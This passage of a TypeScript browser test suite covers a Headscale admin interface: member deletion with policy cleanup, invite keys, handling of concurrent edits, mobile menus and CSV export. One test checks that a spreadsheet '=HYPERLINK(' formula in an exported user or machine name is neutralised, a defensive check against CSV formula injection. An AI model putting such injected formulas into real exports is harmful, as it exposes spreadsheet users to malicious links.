    ipAddresses: ["100.64.0.9"],
    approvedRoutes: [],
    availableRoutes: [],
    subnetRoutes: [],
    tags: [],
  });
  ctx.session.snapshot.applyPatch({
    users: structuredClone(ctx.backend.users),
    nodes: structuredClone(ctx.backend.nodes),
  });
  await page.getByTestId("device-search").fill("mallory");
  await page.getByTestId("export-machines").click();
  const devicesCsv = await csv.text();
  expect(devicesCsv).toContain(`"'=HYPERLINK(`);
  expect(devicesCsv).not.toContain(`"=HYPERLINK(`);
  await ctx.unmount();
  const members = await setup("members");
  members.backend.users.push(mallory);
  members.session.snapshot.applyPatch({ users: structuredClone(members.backend.users) });
  await page.getByTestId("user-search").fill("mallory");
  await page.getByTestId("export-users").click();
  const usersCsv = await csv.text();
  expect(usersCsv).toContain(`"'=HYPERLINK(`);
  expect(usersCsv).not.toContain(`"=HYPERLINK(`);
});

// Catches the UI placeholder leaking into the provider column of a local user.
test("a local user exports an empty provider cell", async () => {
  const csv = captureDownloads();
  await setup("members");
  await page.getByTestId("user-search").fill("alice");
  await page.getByTestId("export-users").click();
  expect(await csv.text()).toMatch(/\n"Alice","alice@example.com","","\d+",/);
});

// Catches a live policy write that precedes a deletion only Headscale can authorize.
test("a rejected member deletion leaves the live policy untouched", async () => {
  const ctx = await setup("members");
  const before = ctx.backend.policy?.policy;
  releaseNodes(ctx, "1");
  ctx.fail("user not empty: node(s) found", "/api/v1/user/1");
  await memberAction("delete", "alice");
  await page.getByTestId("confirm-delete-member").click();
  await expect
    .element(page.getByTestId("delete-member-error"))
    .toMatchTextContent("User still owns machines or auth keys. Remove them before deleting.");
  await expect.element(page.getByTestId("delete-member-dialog")).toBeVisible();
  await expect.element(page.getByTestId("member-alice")).toBeVisible();
  expect(ctx.calls.filter((c) => c.method !== "GET")).toEqual([
    { method: "DELETE", path: "/api/v1/user/1", body: {} },
  ]);
  expect(ctx.backend.policy?.policy).toBe(before);
  await page.getByTestId("confirm-delete-member").click();
  await expect.poll(() => ctx.calls.filter((c) => c.method === "DELETE").length).toBe(2);
  expect(ctx.calls.some((c) => c.method === "PUT")).toBe(false);
});

test("rejected deletion with cleanup unchecked sends only DELETE", async () => {
  const ctx = await setup("members");
  releaseNodes(ctx, "1");
  ctx.fail("user not empty: node(s) found", "/api/v1/user/1");
  await memberAction("delete", "alice");
  await page.getByTestId("delete-member-cleanup-policy").click();
  await page.getByTestId("confirm-delete-member").click();
  await expect.element(page.getByTestId("delete-member-error")).toBeVisible();
  expect(ctx.calls.filter((c) => c.method !== "GET").map((c) => c.method)).toEqual(["DELETE"]);
});

// Catches repeating the delete or losing the cleanup state after the user is already gone.
test("cleanup failure after deletion keeps a retry state and never repeats the delete", async () => {
  const ctx = await setup("members");
  releaseNodes(ctx, "1");
  await memberAction("delete", "alice");
  await expect
    .element(page.getByTestId("delete-member-policy-impact"))
    .toMatchTextContent("group:ops");
  ctx.fail("Policy denied", "/api/v1/policy");
  await page.getByTestId("confirm-delete-member").click();
  await expect.element(page.getByTestId("member-alice")).not.toBeInTheDocument();
  await expect.element(page.getByTestId("delete-member-dialog")).toBeVisible();
  await expect
    .element(page.getByTestId("delete-member-policy-error"))
    .toMatchTextContent("Policy denied");
  await expect.element(page.getByTestId("delete-member-cleanup-pending")).toBeVisible();
  await expect.element(page.getByTestId("confirm-delete-member")).toHaveTextContent("Try again");
  await expect.element(page.getByTestId("confirm-delete-member")).toBeEnabled();
  await expect.element(page.getByTestId("delete-member-cleanup-policy")).toBeDisabled();
  await expect.element(page.getByTestId("cancel-delete-member")).toHaveTextContent("Done");
  expect(ctx.calls.filter((c) => c.method !== "GET").map((c) => c.method)).toEqual([
    "DELETE",
    "PUT",
  ]);
  ctx.fail("");
  await page.getByTestId("confirm-delete-member").click();
  await expect.element(page.getByTestId("delete-member-dialog")).not.toBeInTheDocument();
  expect(ctx.calls.filter((c) => c.method !== "GET").map((c) => c.method)).toEqual([
    "DELETE",
    "PUT",
    "PUT",
  ]);
  const policy = JSON.parse(ctx.backend.policy?.policy ?? "{}");
  expect(policy.groups["group:ops"]).toEqual([]);
  expect(policy.tagOwners["tag:server"]).toEqual([]);
  expect(ctx.backend.users.find((u) => u.id === "2")).toEqual(bob);
  for (const call of ctx.calls.filter(
    (entry) => entry.method === "PUT" && entry.path === "/api/v1/policy",
  )) {
    expect(JSON.parse(String(call.body.policy)).acls).toEqual([
      {
        action: "accept",
        src: ["group:ops"],
        dst: ["tag:server:22"],
        proto: "tcp",
      },
    ]);
  }
});

// The user is already gone, so newer edits are reported and preserved rather than rolled back.
test("newer edits made during cleanup are preserved after the member was deleted", async () => {
  const ctx = await setup("members");
  releaseNodes(ctx, "1");
  await memberAction("delete", "alice");
  const release = ctx.pauseWrites("PUT");
  await page.getByTestId("confirm-delete-member").click();
  await expect.poll(() => ctx.calls.some((call) => call.method === "PUT")).toBe(true);
  const state = ctx.session.policy.policyDesignerState;
  ctx.session.policy.commitState({
    ...state,
    extras: { ...state.extras, hosts: { newer: "10.98.0.0/16" } },
  });
  release();
  await expect.element(page.getByTestId("delete-member-dialog")).not.toBeInTheDocument();
  await expect
    .element(page.getByTestId("policy-save-notice"))
    .toMatchTextContent("Newer edits are still unsaved");
  expect(ctx.calls.filter((call) => call.method === "DELETE")).toHaveLength(1);
  expect(ctx.session.policy.policyPayload?.hosts).toEqual({ newer: "10.98.0.0/16" });
  expect(ctx.session.policy.isPolicyDirty).toBe(true);
  await expect.element(page.getByTestId("member-alice")).not.toBeInTheDocument();
});

// Catches a cleanup that publishes Access edits typed while the DELETE was in flight.
test("a draft that appears during the delete request is not published by the cleanup", async () => {
  const ctx = await setup("members");
  releaseNodes(ctx, "1");
  await memberAction("delete", "alice");
  const release = ctx.pauseWrites("DELETE");
  await page.getByTestId("confirm-delete-member").click();
  await expect.poll(() => ctx.calls.some((call) => call.method === "DELETE")).toBe(true);
  makeDirty(ctx);
  release();
  await expect.element(page.getByTestId("member-alice")).not.toBeInTheDocument();
  await expect.element(page.getByTestId("delete-member-dialog")).toBeVisible();
  await expect
    .element(page.getByTestId("delete-member-policy-impact"))
    .toMatchTextContent(copy.policyUnsavedBlocked);
  await expect.element(page.getByTestId("delete-member-cleanup-pending")).toBeVisible();
  expect(ctx.calls.filter((call) => call.method === "PUT")).toEqual([]);
  discardDraft(ctx);
  await expect.element(page.getByTestId("confirm-delete-member")).toBeEnabled();
  await page.getByTestId("confirm-delete-member").click();
  await expect.element(page.getByTestId("delete-member-dialog")).not.toBeInTheDocument();
  expect(writes(ctx).map((call) => call.method)).toEqual(["DELETE", "PUT"]);
  const saved = JSON.parse(String(writes(ctx)[1]?.body.policy));
  expect(saved.hosts).toBeUndefined();
  expect(saved.groups["group:ops"]).toEqual([]);
});

test("the dialog cannot be dismissed while the cleanup request is pending", async () => {
  const ctx = await setup("members");
  releaseNodes(ctx, "1");
  await memberAction("delete", "alice");
  const release = ctx.pauseWrites("PUT");
  await page.getByTestId("confirm-delete-member").click();
  await expect.poll(() => ctx.calls.some((call) => call.method === "PUT")).toBe(true);
  await expect.element(page.getByTestId("cancel-delete-member")).toBeDisabled();
  await userEvent.keyboard("{Escape}");
  await expect.element(page.getByTestId("delete-member-dialog")).toBeVisible();
  release();
  await expect.element(page.getByTestId("delete-member-dialog")).not.toBeInTheDocument();
  expect(ctx.session.policy.policyPayload?.groups).toEqual({ "group:ops": [], "group:home": [] });
  await expect.element(page.getByTestId("policy-save-notice")).not.toBeInTheDocument();
});

test("reopening the dialog does not show a previous policy-save error", async () => {
  const ctx = await setup("members");
  releaseNodes(ctx, "1");
  await memberAction("delete", "alice");
  ctx.fail("Policy denied", "/api/v1/policy");
  await page.getByTestId("confirm-delete-member").click();
  await expect.element(page.getByTestId("delete-member-policy-error")).toBeVisible();
  await page.getByTestId("cancel-delete-member").click();
  await expect.element(page.getByTestId("delete-member-dialog")).not.toBeInTheDocument();
  await memberAction("delete", "bob");
  await expect.element(page.getByTestId("delete-member-dialog")).toBeVisible();
  await expect.element(page.getByTestId("delete-member-policy-error")).not.toBeInTheDocument();
});

test("removing a policy reference cannot overwrite edits made during its PUT", async () => {
  const ctx = await setup("members", "?user=1&popup=user");
  await expect.element(page.getByTestId("user-detail-dialog")).toBeVisible();
  await expect.poll(() => ctx.session.snapshot.isRefreshing).toBe(false);
  const remove = document.querySelector<HTMLButtonElement>(
    '[data-testid^="remove-user-policy-reference-group-"]',
  );
  if (!remove) throw new Error("Missing membership reference");
  remove.click();
  await expect.element(page.getByTestId("confirm-remove-user-policy-reference")).toBeVisible();
  const release = ctx.pauseWrites();
  await page.getByTestId("confirm-remove-user-policy-reference").click();
  await expect.poll(() => ctx.calls.some((call) => call.method === "PUT")).toBe(true);
  const state = ctx.session.policy.policyDesignerState;
  ctx.session.policy.commitState({
    ...state,
    extras: { ...state.extras, hosts: { newer: "10.97.0.0/16" } },
  });
  release();
  await expect.poll(() => ctx.session.feedback.isActionPending("save-policy")).toBe(false);
  expect(ctx.session.policy.policyPayload?.hosts).toEqual({ newer: "10.97.0.0/16" });
  expect(ctx.session.policy.isPolicyDirty).toBe(true);
});
// Catches detail actions sending the wrong owner or leaving the auth key page unreachable.
test("member detail invites preserve the chosen owner and navigate to auth keys after success", async () => {
  const ctx = await setup("members", "?user=2&popup=user");
  await expect.element(page.getByTestId("user-detail-dialog")).toMatchTextContent("Bob");
  await userEvent.keyboard("{Escape}");
  await page.getByTestId("member-actions-trigger-bob").click();
  await page.getByTestId("create-invite-for-member-bob").click();
  await expect.element(page.getByTestId("invite-user")).toHaveValue("2");
  await page.getByTestId("invite-tags").fill("tag:client");
  await page.getByTestId("create-invite").click();
  await expect.poll(() => ctx.router.state.location.pathname).toBe("/invites");
  const created = ctx.backend.preAuthKeys.find((k) => k.id === "2");
  expect(created).toMatchObject({ user: bob, aclTags: ["tag:client"] });
  // Catches the old hard-coded 2026 default: an untouched dialog must mean seven days from now.
  expectAboutDaysFromNow(created?.expiration, 7);
});
async function openMemberInvite(ctx: Awaited<ReturnType<typeof setup>>) {
  await page.getByTestId("member-actions-trigger-bob").click();
  await page.getByTestId("create-invite-for-member-bob").click();
  await page.getByTestId("invite-tags").fill("tag:client");
  return ctx;
}
// Catches the one-time key from a Members-created invite being dropped before the Auth keys page can show it.
test("a member-created invite hands the one-time key to the invites page", async () => {
  const ctx = await setup("members", "?user=2&popup=user");
  await userEvent.keyboard("{Escape}");
  await openMemberInvite(ctx);
  await page.getByTestId("create-invite").click();
  await expect.poll(() => ctx.router.state.location.pathname).toBe("/invites");
  expect(ctx.session.deviceSetup.getSnapshot().lastCreatedInvite).toBe("created-key");
});
// Catches a rejected create storing a key or navigating away, and a retry that would not recover.
test("failed member invite stores no key and stays on members until a deliberate retry succeeds", async () => {
  const ctx = await setup("members");
  await openMemberInvite(ctx);
  ctx.fail("Create rejected");
  await page.getByTestId("create-invite").click();
  await expect
    .element(page.getByTestId("create-invite-error"))
    .toHaveTextContent("Create rejected");
  expect(ctx.session.deviceSetup.getSnapshot().lastCreatedInvite).toBe("");
  expect(ctx.router.state.location.pathname).toBe("/members");
  ctx.fail("");
  await page.getByTestId("create-invite").click();
  await expect.poll(() => ctx.router.state.location.pathname).toBe("/invites");
  expect(ctx.session.deviceSetup.getSnapshot().lastCreatedInvite).toBe("created-key");
});
// Catches a failed create discarding the earlier one-time key, which Headscale never shows again.
test("a failed member invite keeps the earlier one-time key and stays on members", async () => {
  const ctx = await setup("members");
  ctx.session.deviceSetup.setState({ lastCreatedInvite: "old" });
  await openMemberInvite(ctx);
  ctx.fail("Create rejected");
  await page.getByTestId("create-invite").click();
  await expect
    .element(page.getByTestId("create-invite-error"))
    .toHaveTextContent("Create rejected");
  expect(ctx.session.deviceSetup.getSnapshot().lastCreatedInvite).toBe("old");
  expect(ctx.router.state.location.pathname).toBe("/members");
});
// Catches optimistic assignment changing its baseline after a failed save and disabling retries.
for (const kind of ["groups", "tags"]) {
  test(`an old ${kind} assignment cannot close a reopened editor for the same member`, async () => {
    const ctx = await setup("members");
    await page.getByTestId("member-actions-trigger-bob").click();
    await page.getByTestId(`assign-member-${kind}-bob`).click();
    const option = document.querySelector<HTMLButtonElement>(
      `[data-testid^="assign-user-${kind}-option-"]`,
    );
    if (!option) throw new Error("Missing assignment option");
    option.click();
    const release = ctx.pauseWrites();
    await page.getByTestId(`assign-user-${kind}-apply`).click();
    await expect.poll(() => ctx.calls.some((call) => call.method === "PUT")).toBe(true);
    await userEvent.keyboard("{Escape}");
    await expect.element(page.getByTestId(`assign-user-${kind}-dialog`)).not.toBeInTheDocument();
    await page.getByTestId("member-actions-trigger-bob").click();
    await page.getByTestId(`assign-member-${kind}-bob`).click();
    release();
    await expect
      .poll(() =>
        ctx.session.feedback.isActionPending(
          `assign-user-${kind}` as "assign-user-groups" | "assign-user-tags",
        ),
      )
      .toBe(false);
    await expect
      .element(page.getByTestId("policy-save-notice"))
      .toMatchTextContent("This editor has changed");
    expect(
      kind === "groups"
        ? ctx.session.policy.getSnapshot().assignMembershipsOpen
        : ctx.session.policy.getSnapshot().assignTagOwnershipsOpen,
    ).toBe(true);
    await expect.element(page.getByTestId(`assign-user-${kind}-dialog`)).toBeVisible();
  });

  test(`pending ${kind} assignment cannot replace newer policy edits or close its editor`, async () => {
    const ctx = await setup("members");
    await page.getByTestId("member-actions-trigger-bob").click();
    await page.getByTestId(`assign-member-${kind}-bob`).click();
    const option = document.querySelector<HTMLButtonElement>(
      `[data-testid^="assign-user-${kind}-option-"]`,
    );
    if (!option) throw new Error("Missing assignment option");
    option.click();
    const release = ctx.pauseWrites();
    await page.getByTestId(`assign-user-${kind}-apply`).click();
    await expect.poll(() => ctx.calls.some((call) => call.method === "PUT")).toBe(true);
    const state = ctx.session.policy.policyDesignerState;
    ctx.session.policy.commitState({
      ...state,
      extras: { ...state.extras, hosts: { newer: "10.99.0.0/16" } },
    });
    release();
    await expect
      .poll(() =>
        ctx.session.feedback.isActionPending(
          `assign-user-${kind}` as "assign-user-groups" | "assign-user-tags",
        ),
      )
      .toBe(false);
    expect(ctx.session.policy.policyPayload?.hosts).toEqual({ newer: "10.99.0.0/16" });
    expect(ctx.session.policy.isPolicyDirty).toBe(true);
    await expect.element(page.getByTestId(`assign-user-${kind}-dialog`)).toBeVisible();
    expect(ctx.calls.filter((call) => call.method === "PUT")).toHaveLength(1);
  });

  test(`failed ${kind} assignment keeps selection editable and retries the same policy`, async () => {
    const ctx = await setup("members");
    await page.getByTestId("member-actions-trigger-bob").click();
    await page.getByTestId(`assign-member-${kind}-bob`).click();
    const option = document.querySelector<HTMLButtonElement>(
      `[data-testid^="assign-user-${kind}-option-"]`,
    );
    if (!option) throw new Error("No assignment options");
    option.click();
    ctx.fail("Policy denied");
    await page.getByTestId(`assign-user-${kind}-apply`).click();
    await expect
      .element(page.getByTestId(`assign-user-${kind}-error`))
      .toMatchTextContent("Policy denied");
    await expect.element(page.getByTestId(`assign-user-${kind}-apply`)).toBeEnabled();
    ctx.fail("");
    await page.getByTestId(`assign-user-${kind}-apply`).click();
    await expect.element(page.getByTestId(`assign-user-${kind}-dialog`)).not.toBeInTheDocument();
    const saves = ctx.calls.filter((c) => c.method === "PUT");
    expect(saves).toHaveLength(2);
    expect(saves[0]?.body).toEqual(saves[1]?.body);
  });
}
// Catches a pending mutation allowing reentry/dismissal or applying its result after switching servers.
test("device mutations remain busy and cannot replace a different server snapshot", async () => {
  const ctx = await setup("devices");
  await deviceAction("rename");
  await page.getByTestId("rename-node-dialog-input").fill("old-server-write");
  const release = ctx.pauseWrites();
  await page.getByTestId("rename-node-confirm").click();
  await expect.element(page.getByTestId("rename-node-confirm")).toBeDisabled();
  await expect.element(page.getByTestId("rename-node-cancel")).toBeDisabled();
  await userEvent.keyboard("{Escape}");
  await expect.element(page.getByTestId("rename-node-dialog")).toBeVisible();
  await expect.poll(() => ctx.calls.some((c) => c.method === "POST")).toBe(true);
  const next = fixture();
  if (!next.nodes[0]) throw new Error("Missing fixture node");
  next.nodes[0].givenName = "new-server-name";
  ctx.session.snapshot.setAuthorized(false);
  ctx.session.snapshot.applyPatch(next);
  ctx.session.snapshot.setAuthorized(true);
  release();
  await expect.poll(() => ctx.backend.nodes[0]?.givenName).toBe("old-server-write");
  await expect.element(page.getByTestId("rename-node-dialog")).toBeVisible();
  expect(ctx.session.snapshot.getSnapshot().snapshot.nodes[0]?.givenName).toBe("new-server-name");
  expect(ctx.calls.filter((c) => c.method === "POST")).toHaveLength(1);
});
// Catches an old server policy save mutating the active server's policy draft or closing its assignment layer.
test("stale assignment success does not commit to a new server session", async () => {
  const ctx = await setup("members");
  await page.getByTestId("member-actions-trigger-bob").click();
  await page.getByTestId("assign-member-groups-bob").click();
  const option = document.querySelector<HTMLButtonElement>(
    '[data-testid^="assign-user-groups-option-"]',
  );
  if (!option) throw new Error("No groups");
  option.click();
  const release = ctx.pauseWrites();
  await page.getByTestId("assign-user-groups-apply").click();
  await expect.element(page.getByTestId("assign-user-groups-apply")).toBeDisabled();
  await expect.poll(() => ctx.calls.some((c) => c.method === "PUT")).toBe(true);
  ctx.session.snapshot.setAuthorized(false);
  ctx.session.policy.load('{"groups":{"group:new":["new@example.com"]},"acls":[]}');
  ctx.session.snapshot.setAuthorized(true);
  release();
  await expect
    .poll(() => JSON.parse(ctx.backend.policy?.policy ?? "{}").groups["group:home"])
    .toContain("bob@example.com");
  expect(ctx.session.policy.getSnapshot().policyDraft).toContain("new@example.com");
  expect(ctx.session.policy.getSnapshot().policyDraft).not.toContain("bob@example.com");
});

// Mobile action menus must retain every desktop capability and each dialog's cancellation boundary.
test("mobile device menus expose details and cancel rename tags expire and removal without writes", async () => {
  const ctx = await setup("devices");
  await page.viewport(390, 640);
  for (const [action, dialog] of [
    ["view-node-details", "device-detail-dialog"],
    ["rename-node", "rename-node-dialog"],
    ["edit-node-tags", "node-tags-dialog"],
    ["expire-node", "expire-node-dialog"],
    ["remove-node", "remove-node-dialog"],
  ]) {
    await page.getByTestId("machine-actions-trigger-mobile-1").click();
    await page.getByTestId(`${action}-action-mobile-1`).click();
    await expect.element(page.getByTestId(dialog)).toBeVisible();
    if (dialog === "rename-node-dialog") await page.getByTestId("rename-node-cancel").click();
    else if (dialog === "node-tags-dialog") await page.getByTestId("node-tags-cancel").click();
    else await userEvent.keyboard("{Escape}");
    await expect.element(page.getByTestId(dialog)).not.toBeInTheDocument();
  }
  expect(ctx.calls.filter((call) => call.method !== "GET")).toEqual([]);
});

// Route links must preserve the selected machine and user search across desktop/mobile navigation.
for (const mobile of [false, true]) {
  test(`${mobile ? "mobile" : "desktop"} device route and owner links navigate from the selected row`, async () => {
    const ctx = await setup("devices");
    if (mobile) await page.viewport(390, 640);
    await page
      .getByTestId(mobile ? "machine-actions-trigger-mobile-1" : "machine-actions-trigger-1")
      .click();
    await page
      .getByTestId(mobile ? "view-node-routes-action-mobile-1" : "view-node-routes-action-1")
      .click();
    await expect.poll(() => ctx.router.state.location.pathname).toBe("/routes");
    await ctx.unmount();
    const owner = await setup("devices");
    if (mobile) await page.viewport(390, 640);
    await page.getByTestId("device-owner-link-1").click();
    await expect.poll(() => owner.router.state.location.pathname).toBe("/members");
    expect(owner.router.state.location.search).toMatchObject({ user: "1", popup: "user" });
  });
}

// Wizard navigation and edited preferences must survive backtracking and feed the auth-key payload.
test("device wizard keeps edited preferences when backtracking and opens access controls", async () => {
  const ctx = await setup("devices");
  await page.getByTestId("add-device-toggle").click();
  await page.getByTestId("add-linux-device").click();
  await page.getByTestId("setup-tags-enabled").click();
  await expect.element(page.getByTestId("setup-tags")).toHaveValue("");
  await page.getByTestId("setup-tags-enabled").click();
  await page.getByTestId("setup-tags").fill("tag:custom");
  await page.getByTestId("setup-ephemeral").click();
  await page.getByTestId("add-device-next").click();
  await page.getByTestId("setup-reusable").click();
  await page.getByTestId("setup-expiration-decrement").click();
  await page.getByTestId("setup-expiration-increment").click();
  await expect.element(page.getByTestId("setup-expiration")).toHaveValue("7");
  await page.getByTestId("add-device-prev").click();
  await expect.element(page.getByTestId("setup-tags")).toHaveValue("tag:custom");
  await page.getByTestId("add-device-next").click();
  await page.getByTestId("add-device-step-preferences").click();
  await page.getByTestId("add-device-prev").click();
  await expect.element(page.getByTestId("add-device-options")).toBeVisible();
  await page.getByTestId("add-client-device").click();
  await page.getByTestId("setup-manage-tags").click();
  await expect.poll(() => ctx.router.state.location.pathname).toBe("/access");
});

// Enter confirms a valid rename, while explicit cancel discards a different edited draft.
test("device rename supports keyboard confirmation and device route badges navigate", async () => {
  const ctx = await setup("devices");
  await deviceAction("rename");
  await page.getByTestId("rename-node-dialog-input").fill("keyboard-name");
  await userEvent.keyboard("{Enter}");
  await expect.element(page.getByTestId("device-1")).toMatchTextContent("keyboard-name");
  await page.getByTestId("device-pending-routes-1").click();
  await expect.poll(() => ctx.router.state.location.pathname).toBe("/routes");
});

// Policy-reference removal must retry the same edit after a failed write, then preserve unrelated entries.
test("member details remove group and tag references only after successful policy writes", async () => {
  const ctx = await setup("members", "?user=1&popup=user");
  await expect.element(page.getByTestId("user-detail-dialog")).toMatchTextContent("ready-key");
  ctx.fail("Policy removal denied");
  const groupRemove = document.querySelector<HTMLElement>(
    '[data-testid^="remove-user-policy-reference-group-"]',
  )?.dataset.testid;
  const tagRemove = document.querySelector<HTMLElement>(
    '[data-testid^="remove-user-policy-reference-tagOwner-"]',
  )?.dataset.testid;
  expect(groupRemove).toBeTruthy();
  expect(tagRemove).toBeTruthy();
  await page.getByTestId(groupRemove as string).click();
  await page.getByTestId("confirm-remove-user-policy-reference").click();
  await expect
    .element(page.getByTestId((groupRemove as string).replace("remove-", "")))
    .toBeVisible();
  await expect
    .poll(() => ctx.session.feedback.actionError("save-policy"))
    .toContain("Policy removal denied");
  ctx.fail("");
  await page.getByTestId(groupRemove as string).click();
  await page.getByTestId("confirm-remove-user-policy-reference").click();
  await expect
    .element(page.getByTestId((groupRemove as string).replace("remove-", "")))
    .not.toBeInTheDocument();
  await page.getByTestId(tagRemove as string).click();
  await page.getByTestId("confirm-remove-user-policy-reference").click();
  await expect
    .element(page.getByTestId((tagRemove as string).replace("remove-", "")))
    .not.toBeInTheDocument();
  const policy = JSON.parse(ctx.backend.policy?.policy ?? "{}");
  expect(policy.groups["group:ops"]).toEqual([]);
  expect(policy.tagOwners["tag:server"]).toEqual([]);
  for (const call of ctx.calls.filter(
    (entry) => entry.method === "PUT" && entry.path === "/api/v1/policy",
  )) {
    expect(JSON.parse(String(call.body.policy)).acls).toEqual([
      {
        action: "accept",
        src: ["group:ops"],
        dst: ["tag:server:22"],
        proto: "tcp",
      },
    ]);
  }
  await page.getByTestId("user-detail-device-1").click();
  await expect.poll(() => ctx.router.state.location.pathname).toBe("/devices");
  expect(ctx.router.state.location.search).toEqual({ node: "1", popup: "node" });
});

// Assignment removes an existing principal rather than retaining hidden membership; delete can leave references deliberately.
test("member assignment removes existing group and tag ownership and delete honors cleanup choice", async () => {
  const ctx = await setup("members");
  for (const [kind, ref] of [
    ["groups", "group:ops"],
    ["tags", "tag:server"],
  ]) {
    await page.getByTestId("member-actions-trigger-alice").click();
    await page.getByTestId(`assign-member-${kind}-alice`).click();
    const option = document.querySelector<HTMLElement>(
      `[data-testid^="assign-user-${kind}-option-"]`,
    );
    expect(option).toBeTruthy();
    const assigned = Array.from(
      document.querySelectorAll<HTMLElement>(`[data-testid^="assign-user-${kind}-option-"]`),
    ).find((el) => el.textContent?.includes(ref));
    expect(assigned).toBeTruthy();
    await page.getByTestId(assigned?.dataset.testid ?? "").click();
    await page.getByTestId(`assign-user-${kind}-apply`).click();
    await expect.element(page.getByTestId(`assign-user-${kind}-dialog`)).not.toBeInTheDocument();
    const write = ctx.calls.findLast(
      (entry) => entry.method === "PUT" && entry.path === "/api/v1/policy",
    );
    expect(JSON.parse(String(write?.body.policy)).acls).toEqual([
      {
        action: "accept",
        src: ["group:ops"],
        dst: ["tag:server:22"],
        proto: "tcp",
      },
    ]);
  }
  expect(JSON.parse(ctx.backend.policy?.policy ?? "{}").groups["group:ops"]).toEqual([]);
  await page.getByTestId("open-create-member").click();
  await page.getByTestId("cancel-create-member").click();
  await expect.element(page.getByTestId("member-create-dialog")).not.toBeInTheDocument();
});

// Mobile users must expose the same action set without requiring a hidden desktop trigger.
test("mobile member menus expose details rename memberships tags invites and deletion", async () => {
  const ctx = await setup("members");
  await page.viewport(390, 640);
  for (const [action, dialog] of [
    ["view-member-details", "user-detail-dialog"],
    ["rename-member", "rename-member-dialog"],
    ["assign-member-groups", "assign-user-groups-dialog"],
    ["assign-member-tags", "assign-user-tags-dialog"],
    ["create-invite-for-member", "invite-create-dialog"],
    ["delete-member", "delete-member-dialog"],
  ]) {
    await page.getByTestId("member-actions-trigger-mobile-alice").click();
    await page.getByTestId(`${action}-mobile-alice`).click();
    await expect.element(page.getByTestId(dialog)).toBeVisible();
    if (action === "rename-member") await page.getByTestId("rename-member-cancel").click();
    else await userEvent.keyboard("{Escape}");
    await expect.element(page.getByTestId(dialog)).not.toBeInTheDocument();
  }
  expect(ctx.calls.filter((call) => call.method !== "GET")).toEqual([]);
  await page.getByTestId("member-actions-trigger-mobile-alice").click();
  await page.getByTestId("view-member-machines-mobile-alice").click();
  await expect.poll(() => ctx.router.state.location.pathname).toBe("/devices");
  expect(ctx.router.state.location.search).toEqual({ user: "1" });
});

// Both table detail entry points must expose active keys and machine navigation; closing an origin popup returns to that origin.
test("member detail links and desktop actions retain popup origin and machine search", async () => {
  const ctx = await setup("members", "?user=1&popup=user&from=devices");
  await expect.element(page.getByTestId("user-detail-dialog")).toBeVisible();
  await userEvent.keyboard("{Escape}");
  await expect.poll(() => ctx.router.state.location.pathname).toBe("/devices");
  await ctx.unmount();
  const table = await setup("members");
  await page.getByTestId("member-detail-link-alice").click();
  await expect.element(page.getByTestId("user-detail-dialog")).toMatchTextContent("ready-key");
  await userEvent.keyboard("{Escape}");
  await page.getByTestId("member-actions-trigger-alice").click();
  await page.getByTestId("view-member-details-alice").click();
  await expect.element(page.getByTestId("user-detail-dialog")).toBeVisible();
  await userEvent.keyboard("{Escape}");
  await page.getByTestId("member-actions-trigger-alice").click();
  await page.getByTestId("view-member-machines-alice").click();
  await expect.poll(() => table.router.state.location.pathname).toBe("/devices");
  expect(table.router.state.location.search).toEqual({ user: "1" });
});

// Deleting deliberately without policy cleanup stays available.
test("explicit deletion without reference cleanup remains available", async () => {
  const ctx = await setup("members");
  releaseNodes(ctx, "1");
  await memberAction("delete", "alice");
  await page.getByTestId("delete-member-cleanup-policy").click();
  await expect
    .element(page.getByTestId("delete-member-cleanup-policy"))
    .toHaveAttribute("aria-checked", "false");
  await page.getByTestId("confirm-delete-member").click();
  await expect.element(page.getByTestId("member-alice")).not.toBeInTheDocument();
  expect(ctx.calls.filter((call) => call.method === "PUT")).toEqual([]);
  expect(JSON.parse(ctx.backend.policy?.policy ?? "{}").groups["group:ops"]).toEqual([
    "alice@example.com",
  ]);
});

// A dialog opening read must not restore a member removed while that read was pending.
test("member details ignore removed targets and auth-key owner refresh falls back to a current user", async () => {
  const ctx = await setup("members");
  let release = ctx.pause();
  await page.getByTestId("member-detail-link-bob").click();
  ctx.backend.users = ctx.backend.users.filter((user) => user.id !== "2");
  release();
  await expect.element(page.getByTestId("user-detail-dialog")).not.toBeInTheDocument();
  ctx.backend.users.push(bob);
  ctx.session.snapshot.applyPatch({ users: structuredClone(ctx.backend.users) });
  release = ctx.pause();
  await page.getByTestId("member-actions-trigger-bob").click();
  await page.getByTestId("create-invite-for-member-bob").click();
  ctx.backend.users = ctx.backend.users.filter((user) => user.id !== "2");
  release();
  await expect.element(page.getByTestId("invite-user")).toHaveValue("1");
});

// Desktop detail menus must expose the selected node, and dismissing its origin popup returns to members.
test("desktop device detail actions and origin popup dismissal preserve navigation", async () => {
  const ctx = await setup("devices", "?node=1&popup=node&from=members");
  await expect.element(page.getByTestId("device-detail-dialog")).toBeVisible();
  await userEvent.keyboard("{Escape}");
  await expect.poll(() => ctx.router.state.location.pathname).toBe("/members");
  await ctx.unmount();
  await setup("devices");
  await page.getByTestId("machine-actions-trigger-1").click();
  await page.getByTestId("view-node-details-action-1").click();
  await expect.element(page.getByTestId("device-detail-dialog")).toMatchTextContent("edge-router");
});

const ACL_SSH_POLICY = JSON.stringify({
  acls: [
    { action: "accept", src: ["alice@example.com", "bob@example.com"], dst: ["tag:server:22"] },
    { action: "accept", src: ["bob@example.com"], dst: ["tag:server:80"] },
  ],
  ssh: [{ action: "accept", src: ["alice@example.com"], dst: ["tag:server"], users: ["root"] }],
});
const GRANTS_POLICY = JSON.stringify({
  groups: { "group:ops": ["alice@example.com"] },
  grants: [
    { src: ["group:ops"], dst: ["tag:server"], ip: ["*"], app: { "example.com/app": [{ a: 1 }] } },
  ],
  acls: [],
});
const RENAME_POLICY = JSON.stringify({
  groups: { "group:ops": ["alice@", "alice@example.com"] },
  acls: [{ action: "accept", src: ["alice@"], dst: ["tag:server:22"] }],
});
const summary = (ctx: Awaited<ReturnType<typeof setup>>) =>
  writes(ctx).map((call) => `${call.method} ${call.path}`);

// Catches a cleanup that only knows groups and tag owners while acls and ssh keep a dead user.
test("deleting a member lists acl and ssh references and removes them in one cleanup write", async () => {
  const ctx = await setup("members", "", ACL_SSH_POLICY);
  releaseNodes(ctx, "1");
  await memberAction("delete", "alice");
  await expect.element(page.getByTestId("delete-member-policy-impact")).toBeVisible();
  expect(sectionRows("delete-member-policy-section")).toEqual(["acls", "ssh"]);
  await expect
    .element(page.getByTestId("delete-member-cleanup-policy"))
    .toHaveAttribute("aria-checked", "true");
  await page.getByTestId("confirm-delete-member").click();
  await expect.element(page.getByTestId("delete-member-dialog")).not.toBeInTheDocument();
